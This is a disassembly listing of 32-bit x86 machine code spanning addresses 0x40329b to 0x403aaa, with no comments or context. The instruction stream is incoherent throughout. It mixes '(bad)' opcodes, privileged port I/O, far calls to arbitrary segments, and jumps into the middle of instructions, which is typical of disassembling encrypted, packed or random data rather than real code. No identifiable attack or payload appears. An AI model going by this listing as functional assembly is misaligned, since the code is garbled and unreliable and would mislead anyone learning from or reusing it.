  40329b:	and    bh,al
  40329d:	mov    esi,?
  40329f:	dec    si
  4032a1:	int    0x80
  4032a3:	push   0x70
  4032a5:	es leave 
  4032a7:	add    esp,DWORD PTR [eax+0x1baf2dd0]
  4032ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ae:	test   al,0xe9
  4032b0:	push   cs
  4032b1:	stos   BYTE PTR es:[edi],al
  4032b2:	xor    edx,DWORD PTR [edx-0x37]
  4032b5:	push   esi
  4032b6:	dec    ebx
  4032b7:	add    bl,BYTE PTR [ecx-0x3d]
  4032ba:	pop    ds
  4032bb:	stos   DWORD PTR es:[edi],eax
  4032bc:	push   edi
  4032bd:	ins    BYTE PTR es:[edi],dx
  4032be:	pop    ebx
  4032bf:	jnp    0x40330f
  4032c1:	fwait
  4032c2:	nop
  4032c3:	mov    ebp,fs
  4032c5:	ret    0xce0c
  4032c8:	gs or  eax,0x729baa01
  4032ce:	in     al,dx
  4032cf:	and    DWORD PTR [esi-0x306d6851],esi
  4032d5:	cs dec eax
  4032d7:	pop    eax
  4032d8:	push   es
  4032d9:	ret    
  4032da:	sub    ebx,edi
  4032dc:	fwait
  4032dd:	jbe    0x403293
  4032df:	icebp  
  4032e0:	aam    0x6e
  4032e2:	loop   0x4032b4
  4032e4:	mov    eax,ds:0xc71bcd
  4032e9:	add    BYTE PTR [ebx-0x5e],0x51
  4032ed:	push   ecx
  4032ee:	lods   eax,DWORD PTR ds:[esi]
  4032ef:	dec    ebx
  4032f0:	mov    ebp,0xe29c72d2
  4032f5:	push   ebx
  4032f6:	stc    
  4032f7:	lds    ebx,FWORD PTR [edx-0x5b039529]
  4032fd:	in     al,dx
  4032fe:	aad    0xdd
  403300:	sbb    ebp,DWORD PTR [ecx+0x6a1f71fe]
  403306:	retf   0x979c
  403309:	shl    cl,0x60
  40330c:	aad    0x65
  40330e:	cmp    bh,BYTE PTR [ecx]
  403310:	cdq    
  403311:	add    bh,BYTE PTR [edx+0x22]
  403314:	jne    0x4032bf
  403316:	mov    dl,0x70
  403318:	stos   BYTE PTR es:[edi],al
  403319:	sub    eax,0x8fbd719e
  40331e:	cmp    DWORD PTR [esi-0xb5c7ba1],edx
  403324:	mov    ah,bl
  403326:	and    edx,DWORD PTR [ecx]
  403328:	test   edi,0x86ead162
  40332e:	mov    ebp,0x593bc564
  403333:	retf   0xf8f6
  403336:	out    0xdc,al
  403338:	and    al,0x39
  40333a:	pusha  
  40333b:	out    0xce,eax
  40333d:	fstp   TBYTE PTR [esi]
  40333f:	sbb    DWORD PTR [esi+esi*1-0x36],0x141403f3
  403347:	xchg   ebx,edi
  403349:	repz push 0x77
  40334c:	cmc    
  40334d:	or     BYTE PTR [ebp-0x52],0x53
  403351:	outs   dx,DWORD PTR ds:[esi]
  403352:	or     eax,0xa1e0e3b5
  403357:	fidiv  WORD PTR ds:[ecx-0x41]
  40335b:	scas   eax,DWORD PTR es:[edi]
  40335c:	out    dx,al
  40335d:	into   
  40335e:	ja     0x4032fa
  403360:	imul   ebp,edi,0x12cae1ff
  403366:	mov    eax,0x657a4b91
  40336b:	pop    ebp
  40336c:	jp     0x40330a
  40336e:	lea    esi,[edx+0x60]
  403371:	adc    DWORD PTR [edx],ecx
  403373:	aad    0x2d
  403375:	test   eax,0xc7734ca9
  40337a:	mov    DWORD PTR [ecx+0xc61cc8e],esp
  403380:	xchg   ah,ch
  403382:	push   ecx
  403383:	mov    ds:0xd6e6f2ed,eax
  403388:	dec    esp
  403389:	sbb    ecx,DWORD PTR [ebx-0x72298758]
  40338f:	fsub   st(6),st
  403391:	mov    WORD PTR [eax+0x99d2e3],?
  403397:	jnp    0x4033c4
  403399:	test   DWORD PTR [ecx],ebp
  40339b:	aad    0xd0
  40339d:	pop    es
  40339e:	inc    eax
  40339f:	std    
  4033a0:	dec    ebx
  4033a1:	sbb    dl,bl
  4033a3:	test   eax,0xde382780
  4033a8:	dec    ebx
  4033a9:	push   0x5a
  4033ab:	inc    ebp
  4033ac:	xchg   esi,eax
  4033ad:	push   es
  4033ae:	sbb    ah,BYTE PTR [edx+0x21]
  4033b1:	xchg   DWORD PTR [eax+0x5c86e144],eax
  4033b7:	ret    0x1c86
  4033ba:	cdq    
  4033bb:	or     DWORD PTR [eax],ebp
  4033bd:	cwde   
  4033be:	mov    edi,0x61300ad4
  4033c3:	jbe    0x403387
  4033c5:	add    eax,0x60e3a525
  4033ca:	gs jl  0x4033e0
  4033cd:	or     bh,BYTE PTR ds:0x3745e700
  4033d3:	fiadd  WORD PTR [edi-0x27a65b2c]
  4033d9:	sahf   
  4033da:	shl    BYTE PTR [ebx+0x5e93df22],0x1d
  4033e1:	cmp    eax,0x64e7e5c1
  4033e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033e8:	shl    BYTE PTR [esi+ecx*2],1
  4033eb:	rcl    dh,cl
  4033ed:	mov    al,ds:0x9bbc51b1
  4033f2:	pop    eax
  4033f3:	pop    edi
  4033f4:	sub    eax,0x56b0bab2
  4033f9:	adc    al,dh
  4033fb:	mov    cl,0xc3
  4033fd:	in     eax,dx
  4033fe:	daa    
  4033ff:	imul   BYTE PTR [esi]
  403401:	scas   al,BYTE PTR es:[edi]
  403402:	std    
  403403:	mov    cl,0xc4
  403405:	(bad)  [edx+ebp*8-0x17]
  403409:	sbb    esi,esi
  40340b:	pop    ss
  40340c:	jmp    0x6769057a
  403411:	xchg   ebp,eax
  403412:	pshufw mm0,QWORD PTR [eax+ebx*2],0x72
  403417:	cmp    ah,BYTE PTR [eax]
  403419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40341a:	fs ins DWORD PTR es:[edi],dx
  40341c:	jae    0x4033e8
  40341e:	xor    eax,0x36692aab
  403423:	fisttp QWORD PTR [ebx+0x45eb2c43]
  403429:	push   edx
  40342a:	xor    BYTE PTR [ecx],cl
  40342c:	cmp    DWORD PTR [ecx-0x76db0a48],edi
  403432:	dec    esp
  403433:	and    ecx,DWORD PTR [ebx+0x65]
  403436:	sub    DWORD PTR [ebp+0x59],edx
  403439:	dec    esp
  40343a:	mov    ch,0xc1
  40343c:	inc    ebx
  40343d:	test   al,0x54
  40343f:	aaa    
  403440:	xor    ch,dl
  403442:	(bad)  
  403443:	jge    0x403493
  403445:	cmp    dh,al
  403447:	inc    edi
  403448:	retf   
  403449:	mov    al,0x70
  40344b:	fdiv   QWORD PTR [eax-0x4]
  40344e:	inc    edx
  40344f:	ror    DWORD PTR [edx-0x77282f4d],cl
  403455:	xor    bl,BYTE PTR cs:[ecx-0x1b425dd6]
  40345c:	(bad)  
  40345d:	mov    dh,0x2d
  40345f:	ss mov bh,0xda
  403462:	and    eax,0x98ebcfd4
  403467:	fs arpl ax,sp
  40346a:	dec    edx
  40346b:	sti    
  40346c:	adc    edi,eax
  40346e:	mov    ds:0x32ef1d85,al
  403473:	leave  
  403474:	mov    dh,ch
  403476:	mov    ds:0x2501af59,al
  40347b:	sahf   
  40347c:	ja     0x40349e
  40347e:	cld    
  40347f:	call   0x923:0xbc89e1d9
  403486:	xchg   ebp,eax
  403487:	iret   
  403488:	jnp    0x40346b
  40348a:	mov    esp,ecx
  40348c:	in     al,dx
  40348d:	xchg   ebx,eax
  40348e:	jl     0x4034f3
  403490:	dec    esi
  403491:	test   eax,0xabde4d04
  403496:	int3   
  403497:	cmp    DWORD PTR [ebx],ecx
  403499:	std    
  40349a:	or     eax,0x21c95be9
  40349f:	ins    BYTE PTR es:[edi],dx
  4034a0:	mul    ah
  4034a2:	xor    al,0xfd
  4034a4:	or     eax,0xe7a5f44b
  4034a9:	aaa    
  4034aa:	pop    edi
  4034ab:	dec    ebp
  4034ac:	adc    DWORD PTR [ebp-0x7a189cd8],esp
  4034b2:	iret   
  4034b3:	loopne 0x403520
  4034b5:	xchg   ecx,eax
  4034b6:	les    esp,FWORD PTR [edx+0x7f]
  4034b9:	in     al,0x4a
  4034bb:	and    al,0x7e
  4034bd:	push   0x7a21f9a
  4034c2:	xchg   esp,eax
  4034c3:	adc    edi,DWORD PTR [edx+eiz*1-0x44]
  4034c7:	mul    BYTE PTR [edi-0x19fcac48]
  4034cd:	push   ss
  4034ce:	not    BYTE PTR [ebx-0x2d786dca]
  4034d4:	add    eax,0x1922e3ef
  4034d9:	out    dx,al
  4034da:	inc    edi
  4034db:	in     al,dx
  4034dc:	fisubr DWORD PTR [eax-0x77]
  4034df:	repz bound esp,QWORD PTR [edx]
  4034e2:	jo     0x4034a8
  4034e4:	sub    DWORD PTR [edx*2-0x57662048],ecx
  4034eb:	ret    
  4034ec:	cmp    eax,0x81ef2295
  4034f1:	push   edi
  4034f2:	aam    0x14
  4034f4:	pop    ss
  4034f5:	add    BYTE PTR [edx-0x6d08eace],al
  4034fb:	inc    esp
  4034fc:	es test bh,al
  4034ff:	rcl    BYTE PTR [edi+0x40f2a797],1
  403505:	fidivr WORD PTR [edi-0x5d]
  403508:	or     BYTE PTR gs:[edx+0x28],ah
  40350c:	mov    al,ds:0xb23a190f
  403511:	adc    eax,0xd4bdeea
  403516:	pop    ecx
  403517:	xor    DWORD PTR [edx+0x59],ebp
  40351a:	addr16 pop es
  40351c:	popf   
  40351d:	push   edx
  40351e:	dec    ecx
  40351f:	ins    BYTE PTR es:[edi],dx
  403520:	jmp    0x403509
  403522:	push   esi
  403523:	dec    ecx
  403524:	mov    esp,ebx
  403526:	sar    DWORD PTR [edx],0x41
  403529:	fsubr  DWORD PTR ds:[eax]
  40352c:	fidiv  WORD PTR [ecx-0x46]
  40352f:	sbb    DWORD PTR [edx-0x669038e5],esi
  403535:	mov    ebp,0xf0434c8e
  40353a:	scas   eax,DWORD PTR es:[edi]
  40353b:	mov    eax,ds:0xc9a65f9
  403540:	mov    WORD PTR [ecx-0x51b462],ds
  403546:	aam    0x6e
  403548:	mov    ?,WORD PTR [esi]
  40354a:	lds    ecx,FWORD PTR [esi-0x6b85cb15]
  403550:	xor    edi,edi
  403552:	add    esi,ecx
  403554:	aaa    
  403555:	outs   dx,DWORD PTR ds:[esi]
  403556:	push   esp
  403557:	cmp    dh,BYTE PTR [esi+0x64]
  40355a:	stos   DWORD PTR es:[edi],eax
  40355b:	inc    esi
  40355c:	and    DWORD PTR [edi],ebp
  40355e:	call   0x60e3:0x66a047f2
  403565:	dec    eax
  403566:	nop
  403567:	scas   al,BYTE PTR es:[edi]
  403568:	addr16 adc cl,ch
  40356b:	jmp    0x4b1e9e6d
  403570:	bound  ebp,QWORD PTR [ebx-0x20a8e720]
  403576:	mov    WORD PTR [edx-0x61],ss
  403579:	retf   0x6b4a
  40357c:	fsubr  QWORD PTR [esi]
  40357e:	addr16 jns 0x403553
  403581:	push   esi
  403582:	and    al,0x89
  403584:	ja     0x403592
  403586:	mov    DWORD PTR [eax],ebx
  403588:	out    dx,eax
  403589:	gs stos BYTE PTR es:[edi],al
  40358b:	test   DWORD PTR [ebx+0x48bd62d8],edx
  403591:	clc    
  403592:	xor    ebx,ebp
  403594:	or     BYTE PTR ds:0x13ed068b,0xde
  40359b:	ret    
  40359c:	sbb    bl,BYTE PTR [ebp+eax*1+0x16]
  4035a0:	idiv   DWORD PTR [esi]
  4035a2:	push   ebx
  4035a3:	cmp    ah,BYTE PTR [ebp-0x24]
  4035a6:	call   0x2953:0xb8a2de4a
  4035ad:	es mov edi,0x17a6472e
  4035b3:	jecxz  0x4035c9
  4035b5:	mov    ebp,0x29dffc50
  4035ba:	jbe    0x403589
  4035bc:	sub    dh,BYTE PTR [edi+ebp*4+0x20096d44]
  4035c3:	shl    DWORD PTR [edx+0x241e1b0b],0xe3
  4035ca:	add    eax,0xd784bed2
  4035cf:	outs   dx,BYTE PTR ds:[esi]
  4035d0:	lahf   
  4035d1:	mov    ebp,0xb9f527bc
  4035d6:	inc    edx
  4035d7:	push   ecx
  4035d8:	push   ecx
  4035d9:	add    BYTE PTR [edx-0x415fcb77],dh
  4035df:	dec    edi
  4035e0:	mov    eax,ds:0x1ebcc6ed
  4035e5:	lea    esp,[ebx-0x481eb90]
  4035eb:	ror    DWORD PTR [eax-0x14],1
  4035ee:	cdq    
  4035ef:	cmp    cl,0xed
  4035f2:	jno    0x403673
  4035f4:	mov    eax,0x5fc4d538
  4035f9:	dec    ebp
  4035fa:	xchg   ebp,eax
  4035fb:	call   0x66f1:0x1bb7c2f7
  403602:	xchg   BYTE PTR [eax],bl
  403604:	retf   0x9e62
  403607:	mov    ecx,0xdeed7795
  40360c:	add    eax,edx
  40360e:	out    dx,eax
  40360f:	loop   0x40359a
  403611:	dec    edx
  403612:	push   0x35
  403614:	(bad)  
  403615:	fimul  DWORD PTR [esi]
  403617:	jns    0x403631
  403619:	inc    esi
  40361a:	loopne 0x403681
  40361c:	dec    ebx
  40361d:	or     bl,ah
  40361f:	jp     0x403670
  403621:	push   esi
  403622:	pushf  
  403623:	je     0x4035f2
  403625:	fldenv cs:[esi+0x2]
  403629:	dec    edi
  40362a:	mov    edx,0x5330df98
  40362f:	xor    esp,esp
  403631:	jns    0x4035be
  403633:	mov    bl,0xf9
  403635:	adc    DWORD PTR [edx+eiz*8],ebx
  403638:	test   DWORD PTR [ecx+0x11],ebx
  40363b:	and    eax,0x485f7259
  403640:	pop    edi
  403641:	sbb    ecx,ecx
  403643:	dec    edi
  403644:	enter  0x6e64,0x6a
  403648:	data16 fdiv st,st(0)
  40364b:	jp     0x403642
  40364d:	xchg   ebx,eax
  40364e:	iret   
  40364f:	jbe    0x4036b9
  403651:	add    dl,BYTE PTR [eax-0x70]
  403654:	add    eax,DWORD PTR [ebp-0x42]
  403657:	add    al,0xef
  403659:	retf   0xad20
  40365c:	cli    
  40365d:	sbb    dh,BYTE PTR [eax+0x38a25529]
  403663:	(bad)  
  403664:	push   ecx
  403665:	mov    eax,0xf03998b0
  40366a:	mov    esp,0x83cb5c85
  40366f:	inc    ebx
  403670:	add    edx,DWORD PTR [ebp-0x68]
  403673:	pop    eax
  403674:	aaa    
  403675:	and    cl,BYTE PTR [edi+0x53d1600a]
  40367b:	in     al,0xc4
  40367d:	push   ebp
  40367e:	dec    edi
  40367f:	pop    edx
  403680:	mov    ch,0x62
  403682:	retf   
  403683:	push   ebp
  403684:	call   0xc08f9943
  403689:	je     0x4036bb
  40368b:	jl     0x403614
  40368d:	dec    ebp
  40368e:	sti    
  40368f:	push   ecx
  403690:	cwde   
  403691:	lea    ebx,[edi-0x38567aeb]
  403697:	mov    edx,0x5ca1d7aa
  40369c:	idiv   DWORD PTR [edx]
  40369e:	repz imul eax,DWORD PTR gs:[edi+eiz*1],0x6226690d
  4036a7:	hlt    
  4036a8:	out    dx,al
  4036a9:	mov    bl,0xab
  4036ab:	push   esi
  4036ac:	sub    dl,dh
  4036ae:	jnp    0x403634
  4036b0:	jns    0x4036a1
  4036b2:	ss push 0xdbaca2d2
  4036b8:	push   esi
  4036b9:	pusha  
  4036ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036bb:	mov    ds:0xcc285f92,al
  4036c0:	fcom   QWORD PTR [ebx+0x3a]
  4036c3:	out    0x98,eax
  4036c5:	mov    ch,dh
  4036c7:	imul   eax,DWORD PTR [edi-0x3f404574],0x5e
  4036ce:	test   BYTE PTR [ebp+0x45],ch
  4036d1:	adc    eax,0x3407c799
  4036d6:	fwait
  4036d7:	mov    WORD PTR [edx+0x54bd2a8],?
  4036dd:	jmp    0x24e9a066
  4036e2:	mov    ebp,DWORD PTR [eax-0x2ec6029b]
  4036e8:	shr    dl,0xb9
  4036eb:	mov    dh,0xc2
  4036ed:	pop    edi
  4036ee:	std    
  4036ef:	scas   al,BYTE PTR es:[edi]
  4036f0:	push   0x976fab1c
  4036f5:	mov    ebx,0xe5af2543
  4036fa:	aam    0xe8
  4036fc:	jns    0x403710
  4036fe:	jcxz   0x403692
  403701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403702:	add    al,0x9f
  403704:	loopne 0x403712
  403706:	mov    esp,0xb60ddf52
  40370b:	cld    
  40370c:	dec    ecx
  40370d:	xchg   edx,eax
  40370e:	pop    edx
  40370f:	call   0x39dd:0xbeea
  403715:	mov    ebp,ebx
  403717:	fcomi  st,st(4)
  403719:	nop
  40371a:	sub    al,0xd9
  40371c:	arpl   WORD PTR [ecx+ebp*4-0x66],dx
  403720:	repnz mov cl,0x13
  403723:	std    
  403724:	add    bh,BYTE PTR [eax]
  403726:	mov    al,BYTE PTR [esi-0x5969444]
  40372c:	and    BYTE PTR [edx-0x41abca4d],0xb2
  403733:	popa   
  403734:	jp     0x4036bc
  403736:	pusha  
  403737:	mov    esp,0x5f330f83
  40373c:	mov    esi,0x9f54f048
  403741:	repnz xchg ecx,eax
  403743:	dec    esi
  403744:	in     eax,dx
  403745:	mov    cl,0x29
  403747:	imul   eax,DWORD PTR [ecx+0x6],0xffffffb3
  40374b:	das    
  40374c:	pop    ss
  40374d:	and    eax,0x3a176836
  403752:	xchg   edx,eax
  403753:	jecxz  0x403748
  403755:	xchg   ebp,edx
  403757:	pop    ebp
  403758:	pop    ds
  403759:	jne    0x403763
  40375b:	adc    al,0xc5
  40375d:	add    al,0xb6
  40375f:	hlt    
  403760:	rol    DWORD PTR [ecx+0x7],cl
  403763:	mov    BYTE PTR [ecx],ah
  403765:	mov    edx,0x5d7fdb2a
  40376a:	mov    ebx,0x642062c9
  40376f:	adc    BYTE PTR [esi+0x62],0x66
  403773:	cs (bad) 
  403775:	pop    eax
  403776:	mov    ebp,gs
  403778:	push   0x45c3f87f
  40377d:	sub    BYTE PTR [ecx-0x23],ch
  403780:	sbb    al,0x0
  403782:	sub    bh,dl
  403784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403785:	stos   BYTE PTR es:[edi],al
  403786:	and    BYTE PTR [edi],dh
  403788:	xchg   ecx,eax
  403789:	mov    bl,0xbb
  40378b:	or     BYTE PTR ds:0xc5c49677,dl
  403791:	jo     0x40378e
  403793:	xor    al,0x5b
  403795:	mov    ebp,0x9fb5acd8
  40379a:	add    bl,dl
  40379c:	(bad)  
  40379d:	ds pop ebx
  40379f:	jae    0x403779
  4037a1:	(bad)  
  4037a2:	cmp    DWORD PTR [eax+0x3b2bd175],esp
  4037a8:	aaa    
  4037a9:	and    al,0xdb
  4037ab:	jns    0x403759
  4037ad:	(bad)  [edx+ebx*4+0x6d]
  4037b1:	gs xchg esp,edi
  4037b4:	cmp    edx,DWORD PTR [ecx]
  4037b6:	icebp  
  4037b7:	mov    esi,0xa4582e3b
  4037bc:	(bad)  
  4037bd:	retf   
  4037be:	dec    eax
  4037bf:	shr    DWORD PTR [eax-0x674b8842],0xdf
  4037c6:	test   BYTE PTR [edi],bl
  4037c8:	dec    edi
  4037c9:	push   edx
  4037ca:	ret    0x6021
  4037cd:	ror    BYTE PTR [edx],0xcd
  4037d0:	sbb    al,0x86
  4037d2:	mov    bh,0xb8
  4037d4:	inc    ebp
  4037d5:	in     eax,0xd5
  4037d7:	in     eax,dx
  4037d8:	stc    
  4037d9:	in     eax,0xcd
  4037db:	pop    es
  4037dc:	in     al,0xdc
  4037de:	imul   DWORD PTR [ebp+0x22fca040]
  4037e4:	jecxz  0x40376b
  4037e6:	pusha  
  4037e7:	and    eax,0x15ec1632
  4037ec:	lods   al,BYTE PTR ds:[esi]
  4037ed:	iret   
  4037ee:	dec    ecx
  4037ef:	xor    eax,0x9485adcf
  4037f4:	xor    DWORD PTR [ecx],ebx
  4037f6:	jp     0x4037db
  4037f8:	cs xor eax,0x9235a8ed
  4037fe:	pushf  
  4037ff:	loopne 0x403822
  403801:	cmp    esp,DWORD PTR [eax-0x3c9e780c]
  403807:	pop    eax
  403808:	inc    ecx
  403809:	jg     0x40386d
  40380b:	mov    WORD PTR [ebp-0x483359c7],fs
  403811:	mov    BYTE PTR [edi],0xe6
  403814:	in     al,0xce
  403816:	pop    es
  403817:	icebp  
  403818:	shl    DWORD PTR [esi+0x6de145e3],0xfe
  40381f:	js     0x40383d
  403821:	pop    ds
  403822:	push   edx
  403823:	in     al,0x8e
  403825:	loop   0x4037f1
  403827:	clc    
  403828:	pop    esp
  403829:	fldcw  WORD PTR [ecx]
  40382b:	mov    eax,0x2857419a
  403830:	je     0x4038a8
  403832:	mov    ds:0x655b48ac,eax
  403837:	sbb    al,0x7c
  403839:	fs jle 0x40386a
  40383c:	mov    edx,0xdbb9f7ea
  403841:	mov    ebp,0xdf19842b
  403846:	xlat   BYTE PTR ds:[ebx]
  403847:	mov    al,ds:0x1f38be12
  40384c:	or     al,0xc1
  40384e:	(bad)  
  40384f:	pop    ebx
  403850:	and    al,0x3b
  403852:	imul   esi,DWORD PTR [ecx+0x5e],0x57fc9c1f
  403859:	push   edx
  40385a:	adc    al,0xdf
  40385c:	out    dx,eax
  40385d:	xchg   ebp,eax
  40385e:	in     eax,dx
  40385f:	stc    
  403860:	ins    BYTE PTR es:[edi],dx
  403861:	mov    BYTE PTR [ecx],ch
  403863:	not    DWORD PTR [esi+ebx*2+0x1205ac0]
  40386a:	sar    DWORD PTR [ebx+0x655beb75],cl
  403870:	cld    
  403871:	jl     0x4038a7
  403873:	jno    0x403889
  403875:	shr    BYTE PTR [edi+edx*8-0x10],cl
  403879:	cdq    
  40387a:	dec    BYTE PTR [ecx+ebx*8+0x2946a48a]
  403881:	(bad)  
  403882:	sbb    al,0x2a
  403884:	test   BYTE PTR [ebp-0xd],dl
  403887:	ss mov dl,0x7
  40388a:	addr16 retf 
  40388c:	sub    ah,BYTE PTR [esi+0x6]
  40388f:	ins    BYTE PTR es:[edi],dx
  403890:	dec    ecx
  403891:	dec    eax
  403892:	scas   eax,DWORD PTR es:[edi]
  403893:	or     eax,0xa26cbff4
  403898:	je     0x403846
  40389a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40389b:	loop   0x4038bb
  40389d:	inc    ebx
  40389e:	lods   eax,DWORD PTR ds:[esi]
  40389f:	hlt    
  4038a0:	mov    ds:0x8152c3b1,eax
  4038a5:	add    ebp,ebx
  4038a7:	in     al,dx
  4038a8:	jnp    0x40387e
  4038aa:	pop    edx
  4038ab:	cmp    ah,BYTE PTR [eax+ebx*1]
  4038ae:	lock scas al,BYTE PTR es:[edi]
  4038b0:	daa    
  4038b1:	fst    DWORD PTR [ebx+ebx*4+0x52fd2e91]
  4038b8:	loop   0x4038f5
  4038ba:	push   ss
  4038bb:	jmp    0x4038fa
  4038bd:	lea    esi,[edi+0x24b6cf10]
  4038c3:	jbe    0x4038e3
  4038c5:	fidivr WORD PTR [edi-0x47a087b8]
  4038cb:	dec    esp
  4038cc:	out    0x1c,eax
  4038ce:	cmp    BYTE PTR [eax],ch
  4038d0:	add    eax,ebp
  4038d2:	dec    edx
  4038d3:	pop    edi
  4038d4:	test   eax,0x845b4289
  4038d9:	sub    ebp,DWORD PTR [ecx-0x608f0898]
  4038df:	shl    ch,1
  4038e1:	repz enter 0x6a11,0xa8
  4038e6:	push   es
  4038e7:	fld    DWORD PTR [esi+ebx*2-0x5c9318b5]
  4038ee:	lds    eax,FWORD PTR [esi+edi*1-0x1f]
  4038f2:	gs cwde 
  4038f4:	out    0x4e,eax
  4038f6:	xor    al,0xb8
  4038f8:	xchg   edx,eax
  4038f9:	arpl   WORD PTR ds:0x6030eda4,bx
  4038ff:	mov    dh,0xd3
  403901:	jmp    0x3892:0xc251c51e
  403908:	jge    0x4038e5
  40390a:	mov    ds:0xcd442f3f,al
  40390f:	lods   eax,DWORD PTR ds:[esi]
  403910:	cmc    
  403911:	inc    ebp
  403912:	ins    BYTE PTR es:[edi],dx
  403913:	mov    bl,BYTE PTR [edx-0x5e1494dd]
  403919:	stc    
  40391a:	stos   BYTE PTR es:[edi],al
  40391b:	xor    al,BYTE PTR [eax-0x2d]
  40391e:	or     eax,0x56797475
  403923:	lock addr16 mov edx,0xbad6984d
  40392a:	jne    0x4038f6
  40392c:	leave  
  40392d:	inc    ebp
  40392e:	push   eax
  40392f:	mov    ch,0x5b
  403931:	pop    eax
  403932:	push   es
  403933:	or     BYTE PTR [esi-0x66],cl
  403936:	sub    DWORD PTR [edx-0x31bfb1b],ecx
  40393c:	fistp  WORD PTR [ebp+ecx*2-0x41277305]
  403943:	inc    ebp
  403944:	punpckhwd mm6,QWORD PTR [ebx+0x22178bb1]
  40394b:	fbld   TBYTE PTR [ebx]
  40394d:	jae    0x403954
  40394f:	dec    ecx
  403950:	rol    eax,0x59
  403953:	iret   
  403954:	xlat   BYTE PTR ds:[ebx]
  403955:	ss jl  0x40397c
  403958:	fstp   TBYTE PTR [edi+0x702d7d35]
  40395e:	icebp  
  40395f:	fisttp QWORD PTR [edi-0x461f1b9b]
  403965:	cdq    
  403966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403967:	ins    DWORD PTR es:[edi],dx
  403968:	push   esp
  403969:	inc    esi
  40396a:	popa   
  40396b:	sbb    BYTE PTR [eax+0x26],dl
  40396e:	lods   al,BYTE PTR ds:[esi]
  40396f:	dec    ebx
  403970:	and    ch,BYTE PTR [ecx+ebx*8-0x47e1e65]
  403977:	push   0xffffffbd
  403979:	lea    ebp,[ecx-0x4cdc26d3]
  40397f:	(bad)  
  403980:	fcmovu st,st(0)
  403982:	fwait
  403983:	lea    ecx,[edi-0x48]
  403986:	push   0x4d
  403988:	mov    al,ds:0x9589254b
  40398d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40398e:	add    al,0xfa
  403990:	sub    eax,0xb7ddf8b2
  403995:	xchg   esp,eax
  403996:	mov    ecx,0x8e165d46
  40399b:	in     eax,dx
  40399c:	xchg   BYTE PTR [ecx+0x25],al
  40399f:	and    ah,BYTE PTR [edi]
  4039a1:	mov    edx,0x59dec60c
  4039a6:	add    al,0x47
  4039a8:	pop    esp
  4039a9:	js     0x403a06
  4039ab:	jmp    0x855caacd
  4039b0:	int3   
  4039b1:	push   0xaedc7f8c
  4039b6:	stos   DWORD PTR es:[edi],eax
  4039b7:	nop
  4039b8:	and    eax,0xf4f8e720
  4039bd:	jecxz  0x4039a7
  4039bf:	adc    dl,bh
  4039c1:	lods   al,BYTE PTR ds:[esi]
  4039c2:	aad    0xf7
  4039c4:	popf   
  4039c5:	mov    ch,0x6e
  4039c7:	js     0x4039fd
  4039c9:	and    al,0x68
  4039cb:	mov    ?,WORD PTR [ebp+0x4c641814]
  4039d1:	pop    esi
  4039d2:	sub    BYTE PTR ds:0x56ccc4be,bh
  4039d8:	out    0x44,al
  4039da:	fimul  DWORD PTR [ebp+eiz*2+0x5c]
  4039de:	mov    ecx,0x19a511ad
  4039e3:	retf   0x247c
  4039e6:	fcompp 
  4039e8:	xchg   ecx,eax
  4039e9:	fimul  WORD PTR [esi]
  4039eb:	ret    0x7891
  4039ee:	inc    esp
  4039ef:	(bad)  
  4039f0:	pusha  
  4039f1:	inc    eax
  4039f2:	mov    bl,0x4a
  4039f4:	ins    DWORD PTR es:[edi],dx
  4039f5:	std    
  4039f6:	into   
  4039f7:	jge    0x4039e8
  4039f9:	neg    BYTE PTR [ecx+edx*2+0x32e4d361]
  403a00:	mov    DWORD PTR [esi],ebx
  403a02:	sub    BYTE PTR [edx+esi*4],bl
  403a05:	cmp    al,0xa8
  403a07:	dec    ebx
  403a08:	mov    eax,0xc940e10b
  403a0d:	or     DWORD PTR [ebp+ecx*2+0x1ef3535c],ecx
  403a14:	jae    0x403a66
  403a16:	arpl   WORD PTR [edi],dx
  403a18:	push   0xffffffd7
  403a1a:	dec    ebx
  403a1b:	pop    eax
  403a1c:	add    al,0xde
  403a1f:	loop   0x4039c4
  403a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a22:	stc    
  403a23:	shl    DWORD PTR [ecx],0x7c
  403a26:	mov    ecx,0x3a85674d
  403a2b:	call   FWORD PTR [esi+eiz*8]
  403a2e:	mov    dh,0xea
  403a30:	mov    esi,0xf96c4925
  403a35:	cmp    ecx,edx
  403a37:	jl     0x4039d2
  403a39:	pop    ebx
  403a3a:	popf   
  403a3b:	in     al,0xf7
  403a3d:	pop    esi
  403a3e:	ds cmp esi,0x36767b71
  403a45:	sub    edx,DWORD PTR [esi-0x69]
  403a48:	sub    BYTE PTR [ebx],cl
  403a4a:	adc    eax,0x2cfb8fbc
  403a4f:	ins    DWORD PTR es:[edi],dx
  403a50:	jmp    0x403a63
  403a52:	mov    ecx,0x6994fb88
  403a57:	inc    edx
  403a58:	jns    0x403a7e
  403a5a:	mov    dh,0xfa
  403a5c:	and    al,0xad
  403a5e:	mov    DWORD PTR [edx],ebp
  403a60:	jl     0x403a2b
  403a62:	out    dx,al
  403a63:	add    ch,cl
  403a65:	xchg   esp,eax
  403a66:	fisub  DWORD PTR [eax+0x87fb9ae]
  403a6c:	retf   0x73a
  403a6f:	fs hlt 
  403a71:	nop
  403a72:	fwait
  403a73:	das    
  403a74:	retf   0x889b
  403a77:	clc    
  403a78:	or     edi,ebx
  403a7a:	jle    0x403a12
  403a7c:	into   
  403a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a7e:	xor    DWORD PTR ds:0xf661238f,0xb7242a2a
  403a88:	cmc    
  403a89:	mov    dh,0xa4
  403a8b:	lea    esp,[ebx]
  403a8d:	(bad)  
  403a8f:	inc    edi
  403a90:	push   bx
  403a92:	sbb    al,BYTE PTR [eax]
  403a94:	(bad)  
  403a95:	pop    eax
  403a96:	xor    DWORD PTR [ecx+0x657d062e],0x552d3a4c
  403aa0:	out    dx,al
  403aa1:	mov    dl,BYTE PTR [edi]
  403aa3:	or     al,0x69
  403aa5:	mov    esp,0x752ab8e2
  403aaa:	add    BYTE PTR [esi+0x1d],dh
